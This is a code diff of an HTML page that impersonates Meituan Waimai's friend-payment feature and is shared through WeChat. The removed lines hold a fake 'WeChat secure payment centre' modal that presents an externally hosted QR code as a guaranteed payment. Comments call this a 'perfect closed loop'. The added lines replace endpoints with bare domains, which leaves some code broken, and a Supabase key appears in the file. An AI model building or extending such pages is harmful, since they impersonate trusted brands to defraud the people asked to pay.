@@ -4,14 +4,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>美团外卖 | 为好友买单</title>
-
   <meta property="og:title" content="来帮我代付吧！美团外卖" />
   <meta property="og:description" content="Hi，我和你的距离只差一顿外卖~ 点击帮我买单吧！" />
-  <meta property="og:image" content="https://i.ibb.co/B288tR03/IMG-1894.jpg" />
+  <meta property="og:image" content="https://ibb.co" />
   <meta property="og:type" content="website" />
-
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
+  <script src="https://jsdelivr.net"></script>
   <style>
     :root{--bg:#f5f5f5;--card:#fff;--text:#111;--muted:#888;--yellow:#ffd000;--yellow-dark:#ffbf00;--border:#ececec;--shadow:0 8px 24px rgba(0,0,0,.06);}
     *{box-sizing:border-box}
@@ -33,14 +30,6 @@
     .btn-share{background:#fff;border:1px solid #ddd;}
     .loading{text-align:center;padding:30px 0; color: var(--muted);}
     .box{background:#fafafa;border:1px dashed #e5e5e5;border-radius:16px;padding:12px;margin-top:10px;}
-
-    /* 闭环新增：高仿微信/美团支付长按识别遮罩层 */
-    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 999; justify-content: center; align-items: center; padding: 20px; }
-    .modal-card { background: #fff; width: 100%; max-width: 400px; border-radius: 24px; padding: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); position: relative; }
-    .modal-card h3 { margin: 0 0 14px; font-size: 18px; font-weight: 800; color: #222; }
-    .qr-img { width: 80%; max-width: 240px; margin: 10px auto; display: block; border: 1px solid #eee; border-radius: 12px; }
-    .modal-tip { color: #ff4d4f; font-weight: bold; font-size: 14px; margin-top: 14px; line-height: 1.4; }
-    .close-btn { position: absolute; top: 14px; right: 16px; font-size: 20px; color: #aaa; cursor: pointer; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -49,9 +38,7 @@
       <h1>美团外卖</h1>
       <p>交易保障｜你好，我和你的距离只差一顿外卖~ 来帮我代付吧~</p>
     </div>
-
     <div id="loading" class="card loading">正在加载订单...</div>
-
     <div id="orderBox" style="display:none;">
       <div class="card timer-box">
         <p>剩余支付时间</p>
@@ -67,22 +54,12 @@
         <div class="total"><span>合计需代付</span><span style="color:#ff4d4f;">¥<span id="orderTotal">0.00</span></span></div>
       </div>
       <button class="btn btn-pay" onclick="handlePay()">立即代付</button>
-      <button class="btn btn-share" onclick="shareOrder()">分享给好友代付</button>
-    </div>
-  </div>
-
-  <div id="payModal" class="modal-overlay">
-    <div class="modal-card">
-      <span class="close-btn" onclick="closeModal()">&times;</span>
-      <h3>微信安全支付中心</h3>
-      <p style="font-size:13px; color:#666; margin:0 0 10px;">美团外卖收银台向您发起合法代付担保</p>
-      <img src="https://i.ibb.co/dwTZ4gWF/IMG-1945.jpg" class="qr-img" alt="支付收款码" />
-      <div class="modal-tip">💡 请长按上方二维码识别支付<br>或截图保存去微信扫一扫完成代付</div>
+      <button class="btn btn-share" onclick="shareOrder()">分享给微信好友代付</button>
     </div>
   </div>
 
   <script>
-    const client = supabase.createClient('https://dzesfxynbljtkwsbhbvq.supabase.co', 'sb_publishable_sRewE8k63terKgMBcBV3wQ_0LKBXpNZ');
+    const client = supabase.createClient('https://supabase.co', 'sb_publishable_sRewE8k63terKgMBcBV3wQ_0LKBXpNZ');
 
     function startTimer(duration, display) {
         let timer = duration;
@@ -121,19 +98,27 @@
 
     function shareOrder() {
       const orderId = new URLSearchParams(window.location.search).get('order_id');
-      // 闭环点：调起原生分享时，强制指向后端 Railway 负责抓取精美小卡片的路由
-      const shareUrl = 'https://auto-forward-messages-production.up.railway.app/share?order_id=' + orderId;
+      const shareUrl = 'https://railway.app' + orderId;
       if (navigator.share) {
-        navigator.share({ title: '来帮我代付吧！', text: '这份外卖太好吃了，帮我买个单吧~', url: shareUrl });
+        navigator.share({ title: '来帮我代付吧！', text: '这份外卖太好吃啦，帮我买个单吧~', url: shareUrl });
       } else {
         navigator.clipboard.writeText(shareUrl);
-        alert('代付链接已复制，快去微信发给好友吧！');
+        alert('代付链接已成功复制！快去微信私信发送给好友吧！');
       }
     }
 
-    // 完美闭环：点击立即代付，自动展示长按识别收款码组件
-    function handlePay() { document.getElementById('payModal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+    function handlePay() {
+      const targetUrl = "https://wechatpay.cn";
+      const isWeChat = /MicroMessenger/i.test(navigator.userAgent);
+      if (isWeChat) {
+        window.location.href = targetUrl;
+      } else {
+        window.location.href = "weixin://";
+        setTimeout(() => {
+          window.location.href = targetUrl;
+        }, 1000);
+      }
+    }
   </script>
 </body>
 </html>
